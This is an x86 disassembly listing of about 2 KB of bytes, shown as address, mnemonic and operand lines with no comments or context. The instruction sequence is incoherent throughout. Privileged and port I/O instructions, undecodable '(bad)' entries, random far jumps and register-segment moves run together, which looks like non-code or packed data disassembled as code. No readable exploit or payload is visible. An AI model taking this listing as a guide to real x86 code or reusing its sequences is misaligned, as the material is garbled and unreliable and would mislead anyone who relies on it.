  416718:	fisub  WORD PTR [edx-0x53a48311]
  41671e:	cmp    eax,0xf56b3277
  416723:	adc    eax,0x5552b0c
  416728:	loopne 0x416735
  41672a:	(bad)  ds:0x983b016c
  416730:	jno    0x41676a
  416732:	sub    eax,0x79804d28
  416737:	adc    bl,bh
  416739:	leave  
  41673a:	mov    ch,BYTE PTR [eax]
  41673c:	ffreep st(0)
  41673e:	scas   eax,DWORD PTR es:[edi]
  41673f:	cli    
  416740:	stos   BYTE PTR es:[edi],al
  416741:	push   ss
  416742:	xchg   ecx,eax
  416743:	dec    esi
  416744:	js     0x4167a9
  416746:	ffree  st(4)
  416748:	and    BYTE PTR [ecx+0x2cb6ca8b],bh
  41674e:	std    
  41674f:	ja     0x416762
  416751:	pop    ds
  416752:	xor    al,0xe6
  416754:	mov    ds:0x499f2ad8,al
  416759:	jae    0x416736
  41675b:	les    esp,FWORD PTR [ebx]
  41675d:	jge    0x4167c7
  41675f:	mov    al,ds:0x9255f7c4
  416764:	mov    eax,ds:0x2afdac78
  416769:	xchg   edi,eax
  41676a:	loope  0x41675a
  41676c:	scas   al,BYTE PTR es:[edi]
  41676d:	in     al,dx
  41676e:	in     eax,0x9f
  416770:	cli    
  416771:	jle    0x4167f1
  416773:	std    
  416774:	pop    ebx
  416775:	into   
  416776:	xor    dl,BYTE PTR [eax*2+0x5445d80]
  41677d:	in     al,dx
  41677e:	xchg   edx,eax
  41677f:	xor    al,BYTE PTR [eax+ebp*4]
  416782:	ja     0x41671f
  416784:	fisttp DWORD PTR [ebp+0x43]
  416787:	mov    ss,esp
  416789:	loope  0x4167bc
  41678b:	ja     0x416754
  41678d:	jmp    0x9248:0x46aa90f5
  416794:	sub    BYTE PTR [ebp-0x2ce5a153],al
  41679a:	jae    0x4167b9
  41679c:	xlat   BYTE PTR ds:[ebx]
  41679d:	test   al,0x16
  41679f:	xchg   edx,eax
  4167a0:	sbb    ebp,eax
  4167a2:	in     al,dx
  4167a3:	into   
  4167a4:	mov    esp,DWORD PTR [eax-0x7b]
  4167a7:	xor    al,0xa2
  4167a9:	and    bh,bl
  4167ab:	add    DWORD PTR [edx],edx
  4167ad:	push   0xfaaec591
  4167b2:	or     cl,BYTE PTR [eax+0x44]
  4167b5:	bnd js 0x416763
  4167b8:	ins    BYTE PTR es:[edi],dx
  4167b9:	das    
  4167ba:	and    eax,ecx
  4167bc:	ins    BYTE PTR es:[edi],dx
  4167bd:	sbb    ecx,DWORD PTR [ebx]
  4167bf:	scas   eax,DWORD PTR es:[edi]
  4167c0:	lock and BYTE PTR [esp+ebp*4],al
  4167c4:	cmp    eax,0x7fba15e1
  4167c9:	dec    ebx
  4167ca:	pop    ecx
  4167cb:	ins    BYTE PTR es:[edi],dx
  4167cc:	je     0x416810
  4167ce:	or     BYTE PTR [ecx+0x33],dl
  4167d1:	sbb    bh,BYTE PTR [esi]
  4167d3:	sahf   
  4167d4:	mov    bh,BYTE PTR [ebp+0x42bf961]
  4167da:	rol    dl,0xcb
  4167dd:	sub    esp,esi
  4167df:	scas   al,BYTE PTR es:[edi]
  4167e0:	aas    
  4167e1:	arpl   WORD PTR [edx-0x2120fee],sp
  4167e7:	inc    ebp
  4167e8:	xchg   edx,eax
  4167e9:	test   al,0xd6
  4167eb:	mov    bh,0x94
  4167ed:	add    ebp,DWORD PTR [edi]
  4167ef:	das    
  4167f0:	cs into 
  4167f2:	rcl    DWORD PTR [eax],0x1c
  4167f5:	sub    al,0x1e
  4167f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167f8:	ficom  WORD PTR [edi-0x4a]
  4167fb:	clc    
  4167fc:	add    esi,DWORD PTR [ebp-0x3d38b92e]
  416802:	pop    esp
  416803:	std    
  416804:	push   0xa686cc80
  416809:	fbstp  TBYTE PTR [ebp-0x530add4f]
  41680f:	mov    eax,ds:0x6a71031a
  416814:	sbb    BYTE PTR [edi-0x79b96937],al
  41681a:	inc    eax
  41681b:	loop   0x416879
  41681d:	je     0x416806
  41681f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416820:	ins    DWORD PTR es:[edi],dx
  416821:	add    esp,DWORD PTR [esi-0x3]
  416824:	in     eax,0x2
  416826:	add    edi,DWORD PTR [ebx+0x7a]
  416829:	fwait
  41682a:	test   eax,0x351f1c39
  41682f:	ss push ecx
  416831:	xadd   BYTE PTR [edx],dh
  416834:	sbb    eax,0x39c59a79
  416839:	fs int3 
  41683b:	pusha  
  41683c:	shl    BYTE PTR [ebx-0x1289705d],cl
  416842:	test   DWORD PTR [esi-0x4a],eax
  416845:	fild   DWORD PTR [ecx-0x793b2fa0]
  41684b:	inc    ecx
  41684c:	aaa    
  41684d:	lock daa 
  41684f:	mov    ecx,0x1d4f6693
  416854:	test   BYTE PTR [ebx+0x6e],ah
  416857:	(bad)  
  416858:	std    
  416859:	into   
  41685a:	xor    eax,0xd5f3d8c7
  41685f:	retf   
  416860:	push   DWORD PTR ds:[esi]
  416863:	sub    dh,BYTE PTR [ebp+0x5824c001]
  416869:	mov    esi,0x6a23e71e
  41686e:	sub    eax,0xc4ee266e
  416873:	in     eax,dx
  416874:	pop    edi
  416875:	lock xor bl,bh
  416878:	cmp    ch,BYTE PTR ds:0x697c9742
  41687e:	mov    bh,0xb
  416880:	loop   0x4168ed
  416882:	add    BYTE PTR [ecx+0x47862046],ch
  416888:	mov    edi,0x3cd9aab0
  41688d:	js     0x4168c9
  41688f:	jp     0x416906
  416891:	cmp    esp,DWORD PTR [eax-0x9]
  416894:	mov    edi,0x90a0cf45
  416899:	sbb    eax,DWORD PTR [ecx+0x2820c270]
  41689f:	js     0x416826
  4168a1:	xchg   esi,eax
  4168a2:	ret    0xb986
  4168a5:	std    
  4168a6:	jg     0x4168e3
  4168a8:	hlt    
  4168a9:	cmc    
  4168aa:	cmp    al,0xec
  4168ac:	pop    ds
  4168ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168ae:	ss in  al,dx
  4168b0:	adc    DWORD PTR [edx],0x33b3859f
  4168b6:	add    DWORD PTR [edx+edi*8+0x6c5268d9],edi
  4168bd:	and    ecx,DWORD PTR [eax+0x1bd98158]
  4168c3:	jo     0x41684f
  4168c5:	push   edx
  4168c6:	arpl   WORD PTR [eax+0xddb3c48],di
  4168cc:	mov    ds:0x394a6734,eax
  4168d1:	sub    BYTE PTR ds:0xa6253066,bh
  4168d7:	sub    BYTE PTR [esi-0x7e5408e7],bh
  4168dd:	or     eax,0x35cf111d
  4168e2:	sub    BYTE PTR [ebp-0x79],bh
  4168e5:	cdq    
  4168e6:	imul   ebp,eax,0x13
  4168e9:	adc    BYTE PTR [ebp-0x4a],al
  4168ec:	jne    0x41692c
  4168ee:	cmp    ecx,DWORD PTR [eax-0x220bffa5]
  4168f4:	dec    eax
  4168f5:	mov    dl,0x0
  4168f7:	cmovbe ebx,DWORD PTR [edi-0x6901f253]
  4168fe:	xchg   esp,eax
  4168ff:	in     al,dx
  416900:	not    BYTE PTR [esp+esi*1+0x6db96ebd]
  416907:	jb     0x416954
  416909:	pushf  
  41690a:	lods   eax,DWORD PTR ds:[esi]
  41690b:	sbb    dl,BYTE PTR [eax]
  41690d:	mov    cs,WORD PTR [edx]
  41690f:	not    DWORD PTR [edi+0x528bb670]
  416915:	mov    edi,0x8133c104
  41691a:	fsub   DWORD PTR [ebx+edx*4]
  41691d:	push   ecx
  41691e:	mov    edx,0x23fa6e74
  416923:	ss test eax,0xb7f9292
  416929:	mov    ecx,DWORD PTR [edi+0x9ad97b0]
  41692f:	jp     0x41698a
  416931:	es call 0xa057:0x89fc9151
  416939:	jns    0x4169b1
  41693b:	mov    ebx,0xa9849d8
  416940:	adc    BYTE PTR [esi-0x40419a9f],cl
  416946:	mov    ecx,0xe2c6741e
  41694b:	test   BYTE PTR [ebp+0x4e3a7e57],al
  416951:	ins    BYTE PTR es:[edi],dx
  416952:	mov    esi,DWORD PTR [esi+0xe036573]
  416958:	or     edx,edx
  41695a:	js     0x416926
  41695c:	clc    
  41695d:	cli    
  41695e:	scas   eax,DWORD PTR es:[edi]
  41695f:	jno    0x41694c
  416961:	aas    
  416962:	push   0xffffffd0
  416964:	mov    bh,0xd8
  416966:	mov    bh,0xfe
  416968:	div    BYTE PTR [ebx+eiz*2+0x2589855c]
  41696f:	scas   al,BYTE PTR es:[edi]
  416970:	or     DWORD PTR [ecx],0x5c
  416973:	xor    BYTE PTR [ebx-0xf3128a3],bl
  416979:	jmp    0x2b840733
  41697e:	jge    0x416911
  416980:	xchg   ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	inc    ebp
  416994:	popa   
  416995:	jp     0x416935
  416997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416998:	pop    ds
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0x2a70707e
  4169a0:	test   eax,0x19b63c70
  4169a5:	lods   eax,DWORD PTR ds:[esi]
  4169a6:	out    0x9f,eax
  4169a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169a9:	and    DWORD PTR [eax],0x5328ee87
  4169af:	mov    ah,0x86
  4169b1:	xchg   ecx,eax
  4169b2:	in     eax,dx
  4169b3:	sub    al,0x27
  4169b5:	xlat   BYTE PTR ds:[ebx]
  4169b6:	sar    BYTE PTR [ecx],0xb7
  4169b9:	push   ds
  4169ba:	xor    eax,0x7f51ab0c
  4169c0:	adc    al,0xe
  4169c2:	scas   al,BYTE PTR es:[edi]
  4169c3:	and    al,0xa2
  4169c5:	aad    0x25
  4169c7:	jnp    0x416a31
  4169c9:	bound  edx,QWORD PTR [esi-0x43]
  4169cc:	xlat   BYTE PTR ds:[ebx]
  4169cd:	dec    ebp
  4169ce:	pop    esi
  4169cf:	push   ebx
  4169d0:	cmp    edi,ebp
  4169d2:	jmp    0xc0bb:0xb687c54c
  4169d9:	pop    eax
  4169da:	jecxz  0x416a56
  4169dc:	dec    edi
  4169dd:	push   0xffffffaa
  4169df:	sub    BYTE PTR [edx-0x5e],bl
  4169e2:	or     dh,dl
  4169e4:	cmp    eax,0x6db8f5e3
  4169e9:	jbe    0x41698e
  4169eb:	push   0xffffffb0
  4169ed:	ror    DWORD PTR [edi+0x7bf33529],0x42
  4169f4:	cmc    
  4169f5:	mov    BYTE PTR [esi+0x4c],al
  4169f8:	mov    bl,0x54
  4169fa:	adc    al,0x34
  4169fc:	dec    esi
  4169fd:	dec    edi
  4169fe:	out    dx,al
  4169ff:	mov    eax,ds:0x2f1a79b4
  416a04:	cmp    al,0x20
  416a06:	test   BYTE PTR [esi+0x53],0xb8
  416a0a:	mov    bl,0x97
  416a0c:	add    ch,BYTE PTR [eax+0x72]
  416a0f:	adc    esp,DWORD PTR [eax-0x4e]
  416a12:	dec    edx
  416a13:	int3   
  416a14:	mov    bh,0xc1
  416a16:	cmc    
  416a17:	retf   0xbd65
  416a1a:	mov    edi,0x19eeccff
  416a1f:	xchg   edx,eax
  416a20:	mov    cl,0xf9
  416a22:	pusha  
  416a23:	pop    eax
  416a24:	cmp    al,BYTE PTR [edx+0x23]
  416a27:	ret    0xb0fb
  416a2a:	fidivr DWORD PTR [ecx]
  416a2c:	repnz stos DWORD PTR es:[edi],eax
  416a2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a2f:	or     BYTE PTR [esi],dh
  416a31:	aaa    
  416a32:	fstp   DWORD PTR [ecx+0x66112329]
  416a38:	fiadd  DWORD PTR [esi+ebx*1+0x18137e3e]
  416a3f:	shl    BYTE PTR [ecx+0x9],cl
  416a42:	cdq    
  416a43:	xchg   edi,eax
  416a44:	cld    
  416a45:	jl     0x416a4e
  416a47:	sub    ecx,esi
  416a49:	inc    ebx
  416a4a:	leave  
  416a4b:	aad    0x34
  416a4d:	les    esp,FWORD PTR [ebp-0x29c9a14e]
  416a53:	add    BYTE PTR [esp+edi*1+0x4a],0x51
  416a58:	mov    WORD PTR [ecx+eax*1],?
  416a5b:	mov    ebx,0x461614d4
  416a60:	xchg   DWORD PTR [edx-0x4a],eax
  416a63:	aas    
  416a64:	push   esi
  416a65:	sub    edx,DWORD PTR [ecx+0x53aae449]
  416a6b:	inc    ebp
  416a6c:	push   esp
  416a6d:	retf   
  416a6e:	jo     0x416ac5
  416a70:	test   eax,0xad5b8a4d
  416a75:	xchg   BYTE PTR [edi],dl
  416a77:	std    
  416a78:	or     BYTE PTR [edx+0x412fe73],dh
  416a7e:	xor    ebx,DWORD PTR [ebx]
  416a80:	neg    BYTE PTR [edi]
  416a82:	dec    ebp
  416a83:	or     eax,0x4fb69f6
  416a88:	add    eax,0x48da0271
  416a8d:	adc    al,0xfb
  416a8f:	fst    QWORD PTR [edx+ebp*2-0x7b1b2c5c]
  416a96:	ins    DWORD PTR es:[edi],dx
  416a97:	cdq    
  416a98:	outs   dx,BYTE PTR ds:[esi]
  416a99:	test   ecx,esi
  416a9b:	push   ebp
  416a9c:	cmp    BYTE PTR [edx-0x27],0x72
  416aa0:	aad    0xe2
  416aa2:	or     DWORD PTR [edx-0x60de9d93],0x885bcd2d
  416aac:	out    dx,al
  416aad:	test   al,0x14
  416aaf:	sbb    ah,BYTE PTR [ecx+0x7f]
  416ab2:	ins    BYTE PTR es:[edi],dx
  416ab3:	sub    DWORD PTR [ebp+eax*1-0x2775ef1a],esp
  416aba:	sbb    ah,bl
  416abc:	xor    edi,DWORD PTR [esi-0x6b16a5f5]
  416ac2:	fs pop es
  416ac4:	mul    DWORD PTR [edx+eiz*4-0x5d]
  416ac8:	adc    DWORD PTR [esi+0x9],edx
  416acb:	sbb    dl,al
  416acd:	ss pop ecx
  416acf:	mov    esi,0xe30e241a
  416ad4:	push   ds
  416ad5:	sbb    BYTE PTR [ecx+0x3d],0x4a
  416ad9:	cdq    
  416ada:	fidiv  DWORD PTR [ebx+eax*4+0x5d8f8371]
  416ae1:	mov    ecx,DWORD PTR [ebx+0x1a]
  416ae4:	mov    ah,dl
  416ae6:	mov    ebx,0x2556431
  416aeb:	cmp    BYTE PTR [edi*2+0x3bac01bc],cl
  416af2:	icebp  
  416af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416af4:	dec    edi
  416af5:	inc    ecx
  416af6:	loopne 0x416aeb
  416af8:	or     al,0x48
  416afa:	mov    al,0x77
  416afc:	ins    BYTE PTR es:[edi],dx
  416afd:	and    BYTE PTR [ebx],0xe4
  416b00:	push   cs
  416b01:	cmp    al,0xad
  416b03:	icebp  
  416b04:	leave  
  416b05:	lea    esi,[ecx]
  416b07:	mov    cl,0x59
  416b09:	pusha  
  416b0a:	adc    BYTE PTR [esi],bh
  416b0c:	pusha  
  416b0d:	jmp    0x32545a57
  416b12:	imul   edi,DWORD PTR [ecx+0x28],0xffffff96
  416b16:	jmp    0x8705de70
  416b1b:	cwde   
  416b1c:	or     eax,0x2ee3c07d
  416b21:	adc    ebp,ebx
  416b23:	cmp    DWORD PTR [eax+0x28],edi
  416b26:	dec    esi
  416b27:	clc    
  416b28:	and    esi,DWORD PTR [ebx-0x68eabba4]
  416b2e:	mov    BYTE PTR [esi],al
  416b30:	mov    cl,0x73
  416b32:	mov    esi,0x9535c96
  416b37:	pop    es
  416b38:	mov    esi,0x9cd986e
  416b3d:	sbb    ah,BYTE PTR [ecx]
  416b3f:	dec    ebx
  416b40:	ret    0xa7c5
  416b43:	add    bl,BYTE PTR [eax-0x1d]
  416b46:	push   ecx
  416b47:	cli    
  416b48:	xchg   DWORD PTR [edx-0x2ac14605],esp
  416b4e:	scas   al,BYTE PTR es:[edi]
  416b4f:	out    0x43,al
  416b51:	aas    
  416b52:	mov    ch,BYTE PTR [edi-0x45]
  416b55:	test   eax,0x37feeb93
  416b5a:	or     ah,BYTE PTR [ebp-0x2]
  416b5d:	xor    al,0xc9
  416b5f:	ficomp DWORD PTR [edi+0x41b6d7d6]
  416b65:	jp     0x416b9c
  416b67:	sahf   
  416b68:	test   al,0x60
  416b6a:	mov    eax,0xf76e27b6
  416b6f:	pop    ebp
  416b70:	dec    edi
  416b71:	xrelease mov DWORD PTR [ecx-0x4a10bdb5],ebp
  416b78:	es ret 0x78d4
  416b7c:	iret   
  416b7d:	in     al,0xe1
  416b7f:	mov    al,ds:0xaa14cc20
  416b84:	xchg   esp,eax
  416b85:	test   bh,0x5e
  416b88:	arpl   WORD PTR [edi],si
  416b8a:	lods   eax,DWORD PTR ds:[esi]
  416b8b:	fist   WORD PTR [esi+eax*1]
  416b8e:	xchg   esp,eax
  416b8f:	ins    DWORD PTR es:[edi],dx
  416b90:	mov    ds:0xf3347af1,al
  416b95:	pushf  
  416b96:	(bad)  
  416b97:	sbb    BYTE PTR [eax],al
  416b99:	popf   
  416b9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b9b:	adc    DWORD PTR [eax+0x43],eax
  416b9e:	ret    
  416b9f:	jmp    0xd505a41a
  416ba4:	add    ebp,DWORD PTR [ebx-0x3934c2fb]
  416baa:	sub    bh,BYTE PTR [esi+0x42]
  416bad:	sbb    BYTE PTR [edx-0x6d],ch
  416bb0:	mov    es,WORD PTR [eax]
  416bb2:	xor    dl,BYTE PTR [esi+ecx*2-0x76fc5ea9]
  416bb9:	jecxz  0x416bbc
  416bbb:	or     DWORD PTR [ebx],eax
  416bbd:	jmp    0xabd222c6
  416bc2:	xor    DWORD PTR [esi+0x4f],edx
  416bc5:	in     al,0x52
  416bc7:	nop
  416bc8:	lock mov ebp,0x534287ad
  416bce:	pop    esp
  416bcf:	cwde   
  416bd0:	sbb    BYTE PTR [ebx-0x3b],dl
  416bd3:	jbe    0x416b98
  416bd5:	sti    
  416bd6:	pop    esi
  416bd7:	mov    ds:0x500c0498,al
  416bdc:	call   0x5e7136dd
  416be1:	loopne 0x416c17
  416be3:	pop    ebp
  416be4:	dec    edi
  416be5:	add    BYTE PTR [ecx],cl
  416be7:	pop    ds
  416be8:	fwait
  416be9:	pop    ds
  416bea:	hlt    
  416beb:	ss mov esp,0xb1be2176
  416bf1:	iret   
  416bf2:	(bad)  
  416bf3:	out    dx,eax
  416bf4:	mov    ds:0x4a039450,al
  416bf9:	mov    bl,0xb1
  416bfb:	gs in  al,0x44
  416bfe:	sbb    al,0x66
  416c00:	ds iret 
  416c02:	mov    ch,0x5
  416c04:	hlt    
  416c05:	jmp    0x5045:0xdfd13538
  416c0c:	sbb    eax,0xe44376dc
  416c11:	pop    eax
  416c12:	scas   eax,DWORD PTR es:[edi]
  416c13:	out    0x7e,eax
  416c15:	shl    DWORD PTR [eax+eiz*8+0x3fabc62],0x2c
  416c1d:	iret   
  416c1e:	retf   0x43b2
  416c21:	push   edx
  416c22:	mov    dh,0xd3
  416c24:	(bad)  
  416c25:	jecxz  0x416c9a
  416c27:	and    bh,cl
  416c29:	fdivr  QWORD PTR [esi+ebp*8+0x1a]
  416c2d:	and    bh,BYTE PTR [ecx-0x6c]
  416c30:	icebp  
  416c31:	push   ds
  416c32:	dec    ebp
  416c33:	pusha  
  416c34:	icebp  
  416c35:	aam    0x5
  416c37:	inc    ebx
  416c38:	test   ecx,0x31b2613f
  416c3e:	in     al,dx
  416c3f:	jns    0x416c05
  416c41:	inc    ebp
  416c42:	mov    ebx,DWORD PTR [edi-0x6]
  416c45:	enter  0x43c8,0x4d
  416c49:	cmp    al,0xbe
  416c4b:	mov    ds:0xea620294,eax
  416c50:	iret   
  416c51:	mov    ah,al
  416c53:	and    eax,0x853fae24
  416c58:	pushf  
  416c59:	arpl   WORD PTR [ebp+0x3b],si
  416c5c:	and    eax,0x492f825
  416c61:	imul   DWORD PTR [esi+0x49d66b38]
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	out    0x53,eax
  416c7d:	mov    bh,0x58
  416c7f:	out    dx,al
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416cc8
  416c88:	xor    dl,BYTE PTR [eax-0x3af9312c]
  416c8e:	aaa    
  416c8f:	fistp  WORD PTR [edx]
  416c91:	pop    ecx
  416c92:	jns    0x416c8a
  416c94:	mov    ds:0x2cdbdacd,al
  416c99:	adc    BYTE PTR [ebp-0x3cc12c51],ch
  416c9f:	sub    BYTE PTR ds:0xec6302ed,dh
  416ca5:	ret    0x81ca
  416ca8:	into   
  416ca9:	mov    ebx,0x90de85e8
  416cae:	ret    
  416caf:	xchg   ebx,eax
  416cb0:	aam    0x15
  416cb2:	sub    al,0x2
  416cb4:	push   0x34
  416cb6:	scas   eax,DWORD PTR es:[edi]
  416cb7:	dec    esp
  416cb8:	push   cs
  416cb9:	mov    ebp,DWORD PTR [esi-0x3d185cd7]
  416cbf:	mov    ebp,0xb2dd0e0d
  416cc4:	adc    eax,0xddb9881
  416cc9:	cmp    edx,ebx
  416ccb:	adc    eax,0xf1f0edff
  416cd0:	or     eax,0x882e2245
  416cd5:	fimul  WORD PTR [eax]
  416cd7:	jnp    0x416c80
  416cd9:	cmc    
  416cda:	sbb    al,0x9c
  416cdc:	mov    WORD PTR [eax-0x31],gs
  416cdf:	cmp    eax,0x2c1a2673
  416ce4:	xchg   edi,eax
  416ce5:	clc    
  416ce6:	push   edx
  416ce7:	dec    edx
  416ce8:	xor    eax,0xdc292550
  416ced:	data16 add al,0xb
  416cf0:	outs   dx,BYTE PTR ds:[esi]
  416cf1:	iret   
  416cf2:	out    dx,eax
  416cf3:	aad    0x81
  416cf5:	add    BYTE PTR [ebx-0x2d],cl
  416cf8:	mov    esi,0x2d79d1ba
  416cfd:	inc    edi
  416cfe:	mov    bl,0x97
  416d00:	jmp    0x416d2a
  416d02:	and    DWORD PTR [edi+0x541f48d3],eax
  416d08:	mov    bl,0x49
  416d0a:	pop    eax
  416d0b:	or     BYTE PTR [edi],cl
  416d0d:	outs   dx,BYTE PTR ds:[esi]
  416d0e:	push   cs
  416d0f:	adc    ebp,ebx
  416d11:	jecxz  0x416d08
  416d13:	push   esp
  416d14:	sub    BYTE PTR [edx+0x31],0xa0
  416d18:	fdivr  DWORD PTR [edi+edi*8-0x1cc961f2]
  416d1f:	not    DWORD PTR [edx+0x677d3403]
  416d25:	xchg   ecx,eax
  416d26:	dec    esi
  416d27:	inc    ebp
  416d28:	or     al,0x50
  416d2a:	jl     0x416d1e
  416d2c:	lods   al,BYTE PTR ds:[esi]
  416d2d:	xchg   ecx,eax
  416d2e:	adc    esp,DWORD PTR [edx-0x688ff51f]
  416d34:	pop    esi
  416d35:	add    BYTE PTR [ebx-0x6089ec7a],0x6
  416d3c:	imul   eax,DWORD PTR [edx+0x54879169],0xffffff8e
  416d43:	ror    esp,0x5e
  416d46:	xchg   edi,eax
  416d47:	pop    ds
  416d48:	jb     0x416ceb
  416d4a:	jecxz  0x416d05
  416d4c:	mov    cl,0xf7
  416d4e:	out    dx,eax
  416d4f:	in     al,dx
  416d50:	gs retf 
  416d52:	push   es
  416d53:	jae    0x416dc9
  416d55:	lahf   
  416d56:	dec    ebx
  416d57:	bnd je 0x416d41
  416d5a:	ins    DWORD PTR es:[edi],dx
  416d5b:	push   ebx
  416d5c:	ret    
  416d5d:	mov    ecx,0x1ba912c2
  416d62:	clc    
  416d63:	sub    al,0xdb
  416d65:	(bad)  
  416d66:	fxch   st(4)
  416d68:	push   cs
  416d69:	push   0x6c9c6284
  416d6e:	pushf  
  416d6f:	mov    al,0x4b
  416d71:	xor    BYTE PTR [edi-0x60f29e73],0xfa
  416d78:	jg     0x416d80
  416d7a:	call   0xcfae:0x64ba3d00
  416d81:	xor    edi,0xffffffc9
  416d84:	add    BYTE PTR ds:0xcdb5dc9,cl
  416d8a:	push   ss
  416d8b:	xchg   edx,eax
  416d8c:	dec    eax
  416d8d:	inc    edi
  416d8e:	ds mov dh,0xc0
  416d91:	and    BYTE PTR [eax+0x6c401952],al
  416d97:	mov    dl,0x4b
  416d99:	rep stos DWORD PTR es:[edi],eax
  416d9b:	hlt    
  416d9c:	sbb    BYTE PTR [ecx+ebp*2],al
  416d9f:	mov    dl,0xbf
  416da1:	mov    eax,0x287334f4
  416da6:	jmp    0x416d49
  416da8:	sub    al,0xe7
  416daa:	fcomip st,st(5)
  416dac:	xor    al,BYTE PTR ds:0x72525c15
  416db2:	popa   
  416db3:	add    eax,0xcf47ba6
  416db8:	pop    eax
  416db9:	push   esi
  416dba:	js     0x416db9
  416dbc:	jmp    0x78388215
  416dc1:	mov    ah,0xa2
  416dc3:	jmp    0x5933:0x582e86b6
  416dca:	wrmsr  
  416dcc:	jmp    0x32f3:0xe218d893
  416dd3:	jno    0x416d85
  416dd5:	dec    esi
  416dd6:	loopne 0x416d95
  416dd8:	push   edi
  416dd9:	push   0x7321f03c
  416dde:	jge    0x416daf
  416de0:	jg     0x416dd0
  416de2:	inc    ecx
  416de3:	daa    
  416de4:	mov    al,0x56
  416de6:	inc    edi
  416de7:	jl     0x416d71
  416de9:	sar    DWORD PTR [eax+ebp*2],cl
  416dec:	cmp    DWORD PTR [edi-0x72c519f1],0x35dc3b5d
  416df6:	add    BYTE PTR [esi-0x47dafa26],bh
  416dfc:	lods   eax,DWORD PTR ds:[esi]
  416dfd:	icebp  
  416dfe:	das    
  416dff:	fs jns 0x416da0
  416e02:	xor    ch,BYTE PTR [edi]
  416e04:	dec    ebp
  416e05:	lahf   
  416e06:	dec    ecx
  416e07:	push   edx
  416e08:	div    BYTE PTR [eax+0x12d20995]
  416e0e:	mov    ch,0x79
  416e10:	cmp    ch,BYTE PTR [esp+edi*1]
  416e13:	gs sbb ecx,edx
  416e16:	sbb    bh,BYTE PTR [esi]
  416e18:	mov    WORD PTR [esi-0x52],?
  416e1b:	outs   dx,DWORD PTR ds:[esi]
  416e1c:	mov    edx,0xa575845d
  416e21:	pop    edi
  416e22:	cmp    eax,DWORD PTR [edi-0x45f0c8f3]
  416e28:	fcomp  QWORD PTR [edx-0x2295e124]
  416e2e:	jb     0x416e51
  416e30:	cwde   
  416e31:	sub    DWORD PTR [ebx],esi
  416e33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e34:	dec    edi
  416e35:	push   eax
  416e36:	xor    al,0x89
  416e38:	mov    cl,0xe7
  416e3a:	fdivr  DWORD PTR [ecx+0xf]
  416e3d:	(bad)  
  416e3e:	arpl   ax,dx
  416e40:	retf   
  416e41:	nop
  416e42:	adc    DWORD PTR [eax+0x4550435f],edi
  416e48:	cmp    al,0xa4
  416e4a:	or     eax,0xeee1bb19
  416e4f:	jecxz  0x416ea4
  416e51:	retf   0xbe94
  416e54:	mov    gs,WORD PTR [ecx-0x2b796a95]
  416e5a:	adc    bl,BYTE PTR [ecx]
  416e5c:	push   ebx
  416e5d:	xor    eax,0x1ee2a0d5
  416e62:	or     dl,BYTE PTR [ebp-0x6c]
  416e65:	cmp    BYTE PTR [ebp+0x78],bh
  416e68:	jmp    0x7d74:0x4f472725
  416e6f:	mov    eax,0x51eb546
  416e74:	or     al,0xaa
  416e76:	cwde   
  416e77:	dec    edi
  416e78:	mov    ds:0xaada2a29,al
  416e7d:	mov    ds:0xfa957842,eax
  416e82:	imul   edx,DWORD PTR [edi-0x43],0x61
  416e86:	ret    0x9172
  416e89:	mov    ecx,0xc459064a
  416e8e:	sub    eax,0x4ef92127
  416e93:	popf   
  416e94:	or     dl,BYTE PTR [edi+0x44]
  416e97:	pop    esi
  416e98:	aad    0x6c
  416e9a:	xchg   ecx,eax
  416e9b:	out    dx,eax
  416e9c:	out    0xb0,al
  416e9e:	icebp  
  416e9f:	loop   0x416e3d
  416ea1:	add    eax,0xb89ffc62
  416ea6:	mov    eax,0x47e3124e
  416eab:	or     al,0xc3
  416ead:	mov    cl,0xc
  416eaf:	dec    ecx
  416eb0:	rcr    BYTE PTR [edx+0x15a6ab0],1
  416eb6:	mov    eax,ds:0xdcf72744
  416ebb:	sbb    BYTE PTR [ebx],al
  416ebd:	or     eax,0xb21d1e0
  416ec2:	mov    ecx,0xc99af545
  416ec7:	jmp    0xfdf2:0x19ef9d89
  416ece:	xor    BYTE PTR [ebx+0x354827a],ah
  416ed4:	and    eax,edx
  416ed6:	pop    es
  416ed7:	pop    ecx
  416ed8:	jge    0x416eb4
  416eda:	scas   eax,DWORD PTR es:[edi]
  416edb:	xor    edi,esp
  416edd:	jle    0x416e76
  416edf:	mov    dl,BYTE PTR [ebx+0x575d57fa]
  416ee5:	and    ecx,DWORD PTR [ebx+0x50]
  416ee8:	sbb    al,0x30
  416eea:	cld    
  416eeb:	jb     0x416ee7
  416eed:	inc    esi
  416eee:	cld    
  416eef:	das    
  416ef0:	outs   dx,DWORD PTR ds:[esi]
  416ef1:	inc    esp
  416ef2:	mov    edi,0x157d0630
  416ef7:	xchg   esi,eax
  416ef8:	adc    ch,BYTE PTR [edx]
  416efa:	or     ah,0xa6
  416efd:	jle    0x416e95
  416eff:	and    ebp,DWORD PTR ds:[ebp-0x152c3331]
  416f06:	fs mov edx,0x87d9b82e
  416f0c:	cli    
  416f0d:	test   al,0xd0
  416f0f:	adc    al,0x7f
  416f11:	jb     0x416ef3
  416f13:	shr    BYTE PTR [edx+0x61],1
  416f16:	mov    ds:0x3459d91d,al
  416f1b:	cwde   
  416f1c:	adc    ebx,DWORD PTR [edx]
  416f1e:	loop   0x416f27
  416f20:	push   edx
  416f21:	cli    
